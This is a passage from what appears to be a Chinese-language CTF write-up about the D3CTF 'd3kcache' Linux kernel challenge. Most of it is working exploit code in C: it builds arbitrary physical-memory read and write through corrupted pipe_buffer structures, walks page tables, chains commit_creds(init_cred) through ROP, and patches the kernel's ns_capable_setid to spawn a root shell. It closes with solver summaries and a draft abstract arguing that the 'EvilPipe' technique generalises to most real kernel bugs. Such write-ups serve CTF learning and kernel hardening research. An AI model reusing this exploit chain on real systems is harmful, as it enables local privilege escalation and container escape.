class="hljs-number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);<br>    pmd_addr += page_offset_base;<br><br>    arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pmd_addr), buf);<br>    pte_addr = (buf[PMD_ENTRY(vaddr)] &amp; (~<span class="hljs-number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);<br>    pte_addr += page_offset_base;<br><br>    arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pte_addr), buf);<br>    buf[PTE_ENTRY(vaddr)] = paddr | <span class="hljs-number">0x8000000000000867</span>; <span class="hljs-comment">/* mark it writable */</span><br>    arbitrary_write_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pte_addr), buf,<br>                            <span class="hljs-number">0xff0</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">pgd_vaddr_resolve</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Reading current task_struct...&quot;</span>);<br><br>    <span class="hljs-comment">/* read current task_struct */</span><br>    current_task_page = direct_map_addr_to_page_addr(current_task);<br>    arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) current_task_page, buf);<br>    arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) (current_task_page+<span class="hljs-number">0x40</span>), &amp;buf[<span class="hljs-number">512</span>]);<br><br>    tsk_buf = (<span class="hljs-type">size_t</span>*) ((<span class="hljs-type">size_t</span>) buf + (current_task &amp; <span class="hljs-number">0xfff</span>));<br>    stack_addr = tsk_buf[<span class="hljs-number">4</span>];<br>    mm_struct_addr = tsk_buf[<span class="hljs-number">292</span>];<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] kernel stack&#x27;s addr:\033[0m0x%lx\n&quot;</span>,stack_addr);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] mm_struct&#x27;s addr:\033[0m0x%lx\n&quot;</span>,mm_struct_addr);<br><br>    mm_struct_page = direct_map_addr_to_page_addr(mm_struct_addr);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] mm_struct&#x27;s page:\033[0m0x%lx\n&quot;</span>,mm_struct_page);<br><br>    <span class="hljs-comment">/* read mm_struct */</span><br>    arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) mm_struct_page, buf);<br>    arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) (mm_struct_page+<span class="hljs-number">0x40</span>), &amp;buf[<span class="hljs-number">512</span>]);<br><br>    mm_struct_buf = (<span class="hljs-type">size_t</span>*) ((<span class="hljs-type">size_t</span>) buf + (mm_struct_addr &amp; <span class="hljs-number">0xfff</span>));<br><br>    <span class="hljs-comment">/* only this is a virtual addr, others in page table are all physical addr*/</span><br>    pgd_addr = mm_struct_buf[<span class="hljs-number">9</span>];<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Got kernel page table of current task:\033[0m&quot;</span><br>           <span class="hljs-string">&quot;0x%lx\n\n&quot;</span>, pgd_addr);<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * It may also be okay to write ROP chain on pipe_write&#x27;s stack, if there&#x27;s</span><br><span class="hljs-comment"> * no CONFIG_RANDOMIZE_KSTACK_OFFSET_DEFAULT(it can also be bypass by RETs). </span><br><span class="hljs-comment"> * But what I want is a more novel and general exploitation that </span><br><span class="hljs-comment"> * doesn&#x27;t need any information about the kernel image. </span><br><span class="hljs-comment"> * So just simply overwrite the task_struct is good :)</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * If you still want a normal ROP, refer to following codes.</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COMMIT_CREDS 0xffffffff811284e0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff82201a90</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INIT_CRED 0xffffffff83079ee8</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDI_RET 0xffffffff810157a9</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> RET 0xffffffff810157aa</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">privilege_escalation_by_rop</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> rop[<span class="hljs-number">0x1000</span>], idx = <span class="hljs-number">0</span>; <br><br>    <span class="hljs-comment">/* resolving some vaddr */</span><br>    pgd_vaddr_resolve();<br>    <br>    <span class="hljs-comment">/* reading the page table directly to get physical addr of kernel stack*/</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Reading page table...&quot;</span>);<br><br>    stack_addr_another = vaddr_resolve(pgd_addr, stack_addr);<br>    stack_addr_another &amp;= (~PAGE_ATTR_NX); <span class="hljs-comment">/* N/X bit */</span><br>    stack_addr_another += page_offset_base;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Got another virt addr of kernel stack: \033[0m&quot;</span><br>           <span class="hljs-string">&quot;0x%lx\n\n&quot;</span>, stack_addr_another);<br><br>    <span class="hljs-comment">/* construct the ROP */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; ((<span class="hljs-number">0x1000</span> - <span class="hljs-number">0x100</span>) / <span class="hljs-number">8</span>); i++) &#123;<br>        rop[idx++] = RET + kernel_offset;<br>    &#125;<br><br>    rop[idx++] = POP_RDI_RET + kernel_offset;<br>    rop[idx++] = INIT_CRED + kernel_offset;<br>    rop[idx++] = COMMIT_CREDS + kernel_offset;<br>    rop[idx++] = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE +<span class="hljs-number">54</span> + kernel_offset;<br>    rop[idx++] = *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    rop[idx++] = *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    rop[idx++] = (<span class="hljs-type">size_t</span>) get_root_shell;<br>    rop[idx++] = user_cs;<br>    rop[idx++] = user_rflags;<br>    rop[idx++] = user_sp;<br>    rop[idx++] = user_ss;<br><br>    stack_page = direct_map_addr_to_page_addr(stack_addr_another);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Hijacking current task&#x27;s stack...&quot;</span>);<br><br>    sleep(<span class="hljs-number">5</span>);<br><br>    arbitrary_write_by_pipe((<span class="hljs-keyword">struct</span> page*) (stack_page + <span class="hljs-number">0x40</span> * <span class="hljs-number">3</span>), rop, <span class="hljs-number">0xff0</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">privilege_escalation_by_usma</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-meta">#<span class="hljs-keyword">define</span> NS_CAPABLE_SETID 0xffffffff810fd2a0</span><br><br>    <span class="hljs-type">char</span> *kcode_map, *kcode_func;<br>    <span class="hljs-type">size_t</span> dst_paddr, dst_vaddr, *rop, idx = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">/* resolving some vaddr */</span><br>    pgd_vaddr_resolve();<br><br>    kcode_map = mmap((<span class="hljs-type">void</span>*) <span class="hljs-number">0x114514000</span>, <span class="hljs-number">0x2000</span>, PROT_READ | PROT_WRITE, <br>                     MAP_ANONYMOUS | MAP_PRIVATE, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (!kcode_map) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to create mmap area!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* because of lazy allocation, we need to write it manually */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++) &#123;<br>        kcode_map[i] = <span class="hljs-string">&quot;arttnba3&quot;</span>[i];<br>        kcode_map[i + <span class="hljs-number">0x1000</span>] = <span class="hljs-string">&quot;arttnba3&quot;</span>[i];<br>    &#125;<br><br>    <span class="hljs-comment">/* overwrite kernel code seg to exec shellcode directly :) */</span><br>    dst_vaddr = NS_CAPABLE_SETID + kernel_offset;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] vaddr of ns_capable_setid is: \033[0m0x%lx\n&quot;</span>,<br>           dst_vaddr);<br><br>    dst_paddr = vaddr_resolve_for_3_level(pgd_addr, dst_vaddr);<br>    dst_paddr += <span class="hljs-number">0x1000</span> * PTE_ENTRY(dst_vaddr);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Got ns_capable_setid&#x27;s phys addr: \033[0m&quot;</span><br>           <span class="hljs-string">&quot;0x%lx\n\n&quot;</span>, dst_paddr);<br><br>    <span class="hljs-comment">/* remapping to our mmap area */</span><br>    vaddr_remapping(pgd_addr, <span class="hljs-number">0x114514000</span>, dst_paddr);<br>    vaddr_remapping(pgd_addr, <span class="hljs-number">0x114514000</span> + <span class="hljs-number">0x1000</span>, dst_paddr + <span class="hljs-number">0x1000</span>);<br><br>    <span class="hljs-comment">/* overwrite kernel code segment directly */</span><br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Start overwriting kernel code segment...&quot;</span>);<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * The setresuid() check for user&#x27;s permission by ns_capable_setid(),</span><br><span class="hljs-comment">     * so we can just patch it to let it always return true :)</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">memset</span>(kcode_map + (NS_CAPABLE_SETID &amp; <span class="hljs-number">0xfff</span>), <span class="hljs-string">&#x27;\x90&#x27;</span>, <span class="hljs-number">0x40</span>); <span class="hljs-comment">/* nop */</span><br>    <span class="hljs-built_in">memcpy</span>(kcode_map + (NS_CAPABLE_SETID &amp; <span class="hljs-number">0xfff</span>) + <span class="hljs-number">0x40</span>, <br>            <span class="hljs-string">&quot;\xf3\x0f\x1e\xfa&quot;</span>  <span class="hljs-comment">/* endbr64 */</span><br>            <span class="hljs-string">&quot;H\xc7\xc0\x01\x00\x00\x00&quot;</span>  <span class="hljs-comment">/* mov rax, 1 */</span><br>            <span class="hljs-string">&quot;\xc3&quot;</span>, <span class="hljs-comment">/* ret */</span><br>            <span class="hljs-number">12</span>);<br><br>    <span class="hljs-comment">/* get root now :) */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] trigger evil ns_capable_setid() in setresuid()...\n&quot;</span>);<br><br>    sleep(<span class="hljs-number">5</span>);<br><br>    setresuid(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    get_root_shell();<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Just for testing CFI&#x27;s availability :)</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">trigger_control_flow_integrity_detection</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> buf[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">pbuf</span> =</span> (<span class="hljs-type">void</span>*) ((<span class="hljs-type">size_t</span>)buf + TRD_PIPE_BUF_SZ);<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops</span>, *<span class="hljs-title">ops_addr</span>;</span><br><br>    ops_addr = (<span class="hljs-keyword">struct</span> pipe_buf_operations*) <br>                 (((<span class="hljs-type">size_t</span>) info_pipe_buf.page - vmemmap_base) / <span class="hljs-number">0x40</span> * <span class="hljs-number">0x1000</span>);<br>    ops_addr = (<span class="hljs-keyword">struct</span> pipe_buf_operations*)((<span class="hljs-type">size_t</span>)ops_addr+page_offset_base);<br><br>    <span class="hljs-comment">/* two random gadget :) */</span><br>    ops = (<span class="hljs-keyword">struct</span> pipe_buf_operations*) buf;<br>    ops-&gt;confirm = (<span class="hljs-type">void</span>*)(<span class="hljs-number">0xffffffff81a78568</span> + kernel_offset);<br>    ops-&gt;release = (<span class="hljs-type">void</span>*)(<span class="hljs-number">0xffffffff816196e6</span> + kernel_offset);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123;<br>        pbuf-&gt;ops = ops_addr;<br>        pbuf = (<span class="hljs-keyword">struct</span> pipe_buffer *)((<span class="hljs-type">size_t</span>) pbuf + TRD_PIPE_BUF_SZ);<br>    &#125;<br><br>    evil_2nd_buf.page = info_pipe_buf.page;<br>    evil_2nd_buf.offset = <span class="hljs-number">0</span>;<br>    evil_2nd_buf.len = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">/* hijack the 4th pipe pointing to 2nd pipe */</span><br>    write(pipe_fd[self_3rd_pipe_pid][<span class="hljs-number">1</span>],&amp;evil_4th_buf,<span class="hljs-keyword">sizeof</span>(evil_4th_buf));<br><br>    <span class="hljs-comment">/* hijack the 2nd pipe for arbitrary read, 3rd pipe point to 4th pipe */</span><br>    write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>],&amp;evil_2nd_buf,<span class="hljs-keyword">sizeof</span>(evil_2nd_buf));<br>    write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>], <br>          temp_zero_buf, <br>          TRD_PIPE_BUF_SZ - <span class="hljs-keyword">sizeof</span>(evil_2nd_buf));<br>        <br>    <span class="hljs-comment">/* hijack the 3rd pipe to point to 4th pipe */</span><br>    write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>],&amp;evil_3rd_buf,<span class="hljs-keyword">sizeof</span>(evil_3rd_buf));<br><br>    <span class="hljs-comment">/* write data into dst page */</span><br>    write(pipe_fd[self_2nd_pipe_pid][<span class="hljs-number">1</span>], buf, <span class="hljs-number">0xf00</span>); <br><br>    <span class="hljs-comment">/* trigger CFI... */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[=] triggering CFI&#x27;s detection...\n&quot;</span>);<br>    sleep(<span class="hljs-number">5</span>);<br>    close(pipe_fd[self_2nd_pipe_pid][<span class="hljs-number">0</span>]);<br>    close(pipe_fd[self_2nd_pipe_pid][<span class="hljs-number">1</span>]);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Step.O - fundamental works</span><br><span class="hljs-comment">     */</span><br><br>    save_status();<br><br>    <span class="hljs-comment">/* bind core to 0 */</span><br>    bind_core(<span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">/* dev file */</span><br>    dev_fd = open(<span class="hljs-string">&quot;/dev/d3kcache&quot;</span>, O_RDWR);<br>    <span class="hljs-keyword">if</span> (dev_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to open /dev/d3kcache!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* spray pgv pages */</span><br>    prepare_pgv_system();<br>    prepare_pgv_pages();<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Step.I - page-level heap fengshui to make a cross-cache off-by-null,</span><br><span class="hljs-comment">     * making two pipe_buffer pointing to the same pages</span><br><span class="hljs-comment">     */</span><br>    corrupting_first_level_pipe_for_page_uaf();<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Step.II - re-allocate the victim page to pipe_buffer,</span><br><span class="hljs-comment">     * leak page-related address and construct a second-level pipe uaf</span><br><span class="hljs-comment">     */</span><br>    corrupting_second_level_pipe_for_pipe_uaf();<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Step.III - re-allocate the second-level victim page to pipe_buffer,</span><br><span class="hljs-comment">     * construct three self-page-pointing pipe_buffer </span><br><span class="hljs-comment">     */</span><br>    building_self_writing_pipe();<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Step.IV - leaking fundamental information by pipe</span><br><span class="hljs-comment">     */</span><br>    info_leaking_by_arbitrary_pipe();<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Step.V - different method of exploitation</span><br><span class="hljs-comment">     */</span><br><br>    <span class="hljs-keyword">if</span> (argv[<span class="hljs-number">1</span>] &amp;&amp; !<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;rop&quot;</span>)) &#123;<br>        <span class="hljs-comment">/* traditionally root by rop */</span><br>        privilege_escalation_by_rop();<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (argv[<span class="hljs-number">1</span>] &amp;&amp; !<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;cfi&quot;</span>)) &#123;<br>        <span class="hljs-comment">/* extra - check for CFI&#x27;s availability */</span><br>        trigger_control_flow_integrity_detection();<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (argv[<span class="hljs-number">1</span>] &amp;&amp; !<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;usma&quot;</span>)) &#123;<br>        privilege_escalation_by_usma();<br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">/* default: root by seeking init_task and overwrite current */</span><br>        privilege_escalation_by_task_overwrite();<br>    &#125;<br><br>    <span class="hljs-comment">/* we SHOULDN&#x27;T get there, so panic :( */</span><br>    trigger_control_flow_integrity_detection();<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h1 id="0x03-解题情况"><a href="#0x03-解题情况" class="headerlink" title="0x03.解题情况"></a>0x03.解题情况</h1><p>本次比赛当中一共有 2 支队伍解出了笔者的题目，这个数量倒是出乎笔者的预料又在预料之中（<del>既感觉好多又感觉好少</del>），比较巧的是 <em>刚好一支国内队伍与一支国外队伍</em> ：）</p><p>NU1L 战队的解法是利用 partial overwrite 覆写 <code>msg_msg-&gt;m_list.next</code> 构造 UAF（有点像 CVE-2021-22555 的解法），分配 <code>msg_msgseg</code> 来构造 <code>fake msg_msg</code> 实现越界读，之后利用 <code>fcntl(F_SETPIPE_SZ)</code> 改小 <code>pipe_buffer</code> 后转移 UAF 到 <code>pipe_buffer</code> 上从而构造 dirty pipe 覆写 busybox，不过比较出乎笔者预料的是他们并没有用页级堆风水，而是选择<strong>直接堆喷大量 msg_msg</strong>，这样题目所在的 slub 页面与 <code>msg_msg</code> 所在 slub 页面便还是有一定几率挨到一起（由于大小 0x1000 的 <code>msg_msg</code> 所在 slab <strong>同样来自于 order-3</strong>，因此实际上仅纯堆喷也有一定的几率使得对应 slab 挨在一起）</p><p>TeamGoulash 的解法前半段与官方解法的中段基本上是一致的，即利用  <code>fcntl(F_SETPIPE_SZ)</code> 改大  <code>pipe_buffer</code> 到 order-3 后通过对 page 指针的 partial overwrite 构造 page-level 的 UAF，之后在 UAF page 上分配新的 <code>pipe_buffer</code> ，不过他们并没有像笔者那样继续构造自读写管道来完成内存空间任意读写，<strong>而是将 UAF page 分配为新进程的页表页面</strong>（由于 COW 机制，<code>fork()</code> 创建新进程的过程中其实仅会分配新的页表项及其他内核结构体，这使得我们有不小的概率使 UAF 页面被复用为页表中的某一级页面），之后<strong>将 busybox 映射到 UAF 页表项对应的内存空间，从而完成越权写入</strong>，由于缺乏有效的堆风水手段以及页分配的不稳定性导致<strong>成功率较低</strong>（毕竟分配过程当中还是有非常多的噪音，据该战队自述成功率只有 5%）</p><blockquote><p>以及 TeamGoulash 为笔者展现了一个很有趣的操作：通过睡眠一定的时间使得旧的 TLB 无效化</p><p><img src="https://s2.loli.net/2023/05/01/SFKbgnzPJdIYUZT.png" alt="TeamGoulash 在 WP 中的表情.jpg"></p></blockquote><p>两只战队的解法大体上其实都在预期之内（笔者一开始想的就是利用 <code>msg_msg</code> ），同时这道题目没有出现去年那样的大面积非预期情况，可喜可贺可喜可贺👏👏👏</p><h1 id="0x04-总结与反思"><a href="#0x04-总结与反思" class="headerlink" title="0x04. 总结与反思"></a>0x04. 总结与反思</h1><h2 id="pipe-buffer-arbitray-read-amp-write？"><a href="#pipe-buffer-arbitray-read-amp-write？" class="headerlink" title="pipe_buffer arbitray read &amp; write？"></a>pipe_buffer arbitray read &amp; write？</h2><p>毫不谦虚地说，笔者认为自己出的这道题目在对于内核中内存损坏类型漏洞的 “通解” 的探索相比<a href="https://arttnba3.cn/2022/03/08/CTF-0X06-D3CTF2022_D3KHEAP">去年</a>而言是有着一定距离的突破的——我们成功在一个非常极端的环境下完成了内核漏洞利用</p><p>而如果将官方解在不同漏洞场景下进行推广，得益于 <code>pipe_buffer</code> 大小的可调节性以及无需 <code>bzImage</code> 信息便能完成提权的便捷性，我们不难发现的是<strong>这个方法可以被很快地应用并推广到绝大部分的漏洞上，并在真实场景下完成漏洞利用</strong>，这也是为什么笔者要魔改《eva：终》的宣传语来作为题目描述——<strong>我们或许真的为内核内存损坏型漏洞找到了一种足够强大的通法：）</strong></p><p>不过这种方法并非是笔者第一个发现的（虽然笔者一开始确乎这么以为），据笔者了解类似的改写 <code>pipe_buffer.page</code> 的方法似乎早已被应用到实战的安卓攻防当中，同时<a href="https://interruptlabs.co.uk/labs/pipe_buffer/">来自 Interrupt Labs 的研究员也在去年发现了这种方法</a></p><blockquote><p>该 Lab 的安全研究员一开始也以为自己独立发现了一种新方法，结果一看 <a href="https://i.blackhat.com/USA-22/Wednesday/US-22-Jin-Monitoring-Surveillance-Vendors.pdf">BlackHat 上好像讲过在安卓上已经存在在野利用了</a>，<del>和笔者同病相怜属于是</del></p></blockquote><p>虽然说这种方法似乎没有被正式命名，但是既然早就存在在野利用的话那自然笔者是没有命名资格了，至少笔者不会为了所谓 “青史留名” 而擅自将这种早就出现过的利用方法冠上自己的名字（笑）</p><!--glibc 利用近几年国内新出现的少数几个所谓 “house of xx” 在笔者看来真的是难以形容......这也是笔者为什么最近基本上没有在做常规的 Linux 用户态 pwn 的缘故（当然虚拟化逃逸还是挺有意思的），新出现的一些东西有点过于浮躁且浮夸了：( \n当然这并不代表笔者认为这些人或是这些事情恶心，也不代表笔者对这样的现象的一种批判--><h2 id="page-level-UAF"><a href="#page-level-UAF" class="headerlink" title="page-level UAF?"></a>page-level UAF?</h2><p>不过虽然说利用 <code>pipe_buffer</code> 进行内存任意读写的操作并非作者首创，但是 <em>在内存页这一级进行 double free 以及 UAF 利用据笔者所知应该是笔者首创</em> ，有了 page-level UAF，我们可以很轻易地在不同的 <code>kmem_cache</code> 之间进行跨 <code>kmem_cache</code> 的 UAF 利用，从而打破 <code>kmem_cache</code> 甚至是直接进行内存页分配的其他子系统之间的间隔（例如页表），目前笔者所设想的利用手法有：</p><ul><li>将一张 page 释放成为另一张 page，从而完成对指定内核对象的 UAF利用（这便是本题的做法）<ul><li>可以是针对 page 进行 double free</li><li>也可以是 slab objects 的全部释放导致的 slab free 后的 page UAF</li><li>…</li></ul></li><li>将一张 page 释放为内核子系统中的某个组件<ul><li>例如：页表</li><li>…</li></ul></li></ul><p>作为刚刚出现在 CTF 当中的新的利用手法，page-level UAF 还有更多值得我们去探索的地方</p><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>总的来说，笔者对于自己今年所出的这一道题还是挺满意的，希望未来能够给大家带来更多更有趣的内核漏洞利用手法 ：）</p><h1 id="0xFF-一些小彩蛋"><a href="#0xFF-一些小彩蛋" class="headerlink" title="0xFF. 一些小彩蛋"></a>0xFF. 一些小彩蛋</h1><blockquote><p>笔者个人发疯部分，这里可以不用看了（笑）</p></blockquote><p>最近写论文写得快疯魔了，所以笔者为这道题目也简单写了一段：）</p><blockquote><p>《<strong>EvilPipe: Another General Exploitation Method On Linux kernel Vulnerabilities</strong>》</p><p><strong>Abstract</strong></p><p>在实战中对 Linux kernel 的内存损坏漏洞进行利用往往需要面临诸多挑战，来自硬件与软件层面的诸多保护使得漏洞利用变得困难，内核镜像信息的缺失也令合法攻击载荷的构造变得不可能；现有的一些工作也在尝试寻找无需进行控制流劫持的更具有通用性的攻击手法，如 Pipe Primitive 选择将漏洞形式转换为 DirtyPipe 完成利用，DirtyCred 则将漏洞转换为对内核中的 credentials 结构体的改写以完成利用；但这些利用手法往往仍需要一定级别的权限（例如，至少需要能够读取或执行特权文件），仍然缺乏足够的通用性</p><p>本文介绍 EvilPipe——一种更具有通用性的利用手法，这项技术允许我们将绝大多数的内核中的内存损坏漏洞（甚至仅是一个 ‘\0’ 字节的堆溢出），转换为无需任何特权的无限的对物理内存的任意读写能力，并能完美绕过包括 KASLR、SMEP、SMAP 在内的多项主流缓解措施；有了 EvilPipe，一个恶意的本地攻击者可以在无需内核镜像信息的情况下通过已知的内核漏洞完成提权与容器逃逸；我们在多个保护完备的 Linux 系统下对多个 <code>（此处暂定）</code> 真实世界中的漏洞完成了对这种利用手法的评估，并发现 EvilPipe 在多个 <code>（此处暂定）</code> 真实世界的漏洞上可以完成利用，这意味着这项技术的通用性；在完成可用性评估之后，我们提出了一种新的保护机制，通过在数据拷贝前添加额外的验证机制以防止 EvilPipe 类型的利用方法，经实验评估，我们所提出的新机制带来的负担是可以忽略不计的</p><p><strong>KEYWORDS</strong></p><p>OS Security; Kernel Exploitation; Privilege Escalation</p><p><strong>1 INTRODUCTION</strong></p><p>现如今 Linux 已然成为全世界最为流行的开源操作系统，得益于其开源的特性与优秀的设计，我们可以在包括云服务器、移动设备、物联网设备、网络基础设施在内的绝大部分设备上看到 Linux 内核的身影，而极高的流行性也令 Linux 吸引了无数网络攻击者与黑客们的兴趣。虽然 Linux 内核每年被爆出的漏洞高达数百个[3]，但在实战中对内核漏洞的利用往往面临着一系列困难的挑战。从内核层面而言，诸如 KASLR[1]、KPTI [2]、 CFI[4] 等保护为控制流劫持攻击增添了不少难度。从硬件层面而言， SMEP、SMAP、NX-bit 等保护也令形如 ret2usr[5]、ret2dir[5] 这样的攻击变得极为困难。内核镜像信息的缺失更是使得攻击者无法获取到内核代码片段的具体信息，从而使得类似 ROP&#x2F;JOP 这样的利用手法难以被应用。</p><p>相较于劫持内核的执行流，在实战中更受人青睐的内核漏洞则是无需特定于某个内核二进制信息的逻辑类漏洞。曾经非常火热的 CVE-2016-5195（也被称为 “DirtyCOW”）便是一个非常经典的这样的逻辑漏洞，其通过 Linux 内核中的条件竞争漏洞完成对特权文件的越权写入以进行提权，而不需要直接对抗内核中的诸多安全机制，这使得这个漏洞能够适用于实战中的多个不同的复杂场景。CVE-2022-0847（也被称为“DirtyPipe”）由于其类似的通用性于去年在安全界变得流行，其为一个对 pipe 结构体中标志位的错误设置，这可以使得攻击者利用该漏洞完成对特权文件的越权写入以进行提权，而不需要直接对抗内核中的多种保护。</p><p>在本文中我们提出了一种更为通用、强大的利用方法，称之为 EvilPipe。这项技术利用了内核中管道结构体的可重分配性与高度灵活性，这允许我们将绝大多数的内核中的内存损坏漏洞（甚至仅是一个 ‘\0’ 字节的堆溢出），转换为无需任何特权的近乎无限的对物理内存的任意读写能力，这意味着我们可以通过这种利用方法获取对内核的完全控制权，从而无需直接对抗任何主流的保护措施便能完成内核提权与容器逃逸的工作。同时，这项技术并不需要任何更高的系统权限（例如，读取 &#x2F;etc&#x2F;passwd），也不依赖于系统环境中的任何特权文件（例如， pkexec），且不需要任何额外的特定于内核镜像的内核信息，这意味着我们可以在绝大部分存在已知漏洞的Linux系统上直接应用这种利用手法完成攻击，因此这种方法在实战当中具有极高的可用性。</p><p>相比于其他的利用技术， EvilPipe 有着如下优点。首先，EvilPipe 的核心仅是 pipe 系统调用，作为一个基础设施 pipe 系统调用在每一个基于 Linux 的系统上都是可以使用的，这意味着 EvilPipe 近乎不存在任何的使用门槛。其次，EvilPipe 有着高度的灵活性，可以完美契合多个不同大小的内核漏洞对象。对于 UAF 漏洞而言，EvilPipe 仅要求漏洞对象与通用的 GFP_KERNEL_ACCOUNT 分配标志位来自同一 kmem_cache（内核当中的大部分对象都满足该要求）。对于溢出漏洞而言，EvilPipe 的最低要求仅为一个 \0 字节（这同样适用于跨 kmem_cache 间内存页的溢出，我们将在后文使用一种名为页级堆风水的技术来完成它）。这意味着我们可以将绝大部分的内存损坏类漏洞转换为 EvilPipe 以完成利用。最后，EvilPipe 不直接与任何的内核保护措施进行对抗，也不需要关于当前内核的任何信息，且不会留下任何痕迹，这意味着 EvilPipe 可以被应用于近乎所有的攻击环境。</p><p>此外，我们认为 EvilPipe 并不仅代表针对 pipe 系统调用的利用方法，而是代表了与传统的漏洞利用技术所不同的研究方向：将内核漏洞利用方法从传统的代码执行转向构造逻辑漏洞，从而无需直接与众多内核保护措施进行直接对抗，并大幅减少漏洞利用对特定于指定环境的依赖度。我们认为在漏洞利用上这是一个值得令人探索的方向。</p><p>在完成概念验证之后，我们将多个 Linux 内核中的内存损坏漏洞改写为 EvilPipe，并在多个保护完备的 Linux 